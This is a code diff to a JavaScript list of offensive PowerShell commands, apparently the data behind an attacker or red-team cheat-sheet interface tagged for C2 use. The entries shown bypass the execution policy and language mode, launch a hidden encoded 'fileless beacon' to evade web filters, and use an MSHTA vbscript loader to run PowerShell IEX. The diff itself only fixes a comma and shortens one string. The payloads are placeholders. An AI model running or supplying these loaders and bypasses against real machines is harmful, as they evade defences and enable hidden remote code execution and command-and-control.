@@ -644,7 +644,7 @@ const COMMANDS = [
     code: "Set-ExecutionPolicy Unrestricted -Scope Process -Force\n[System.Management.Automation.Utils]::CachePowerShellAssembly()\n$env:__PSLockdownPolicy=8\n$ExecutionContext.SessionState.LanguageMode = \"FullLanguage\"",
     tags: ["ps"],
     accent: "#00f0ff"
-  }
+  },
   {
     title: "Fileless Beacon (Encoded) - Bypass Web Filters",
     code: "powershell -ep bypass -w hidden -enc [BASE64_ENCODED_PAYLOAD]",
@@ -683,7 +683,7 @@ const COMMANDS = [
   },
   {
     title: "MSHTA Loader",
-    code: "mshta vbscript:Execute(\"CreateObject(\"\"Wscript.Shell\"\").Run \"\"powershell -ep bypass IEX(...)\"\", 0:close\")",
+    code: "mshta vbscript:Execute(CreateObject(Wscript.Shell).Run powershell...)",
     tags: ["ps", "c2"],
     accent: "#ff6b35"
   },
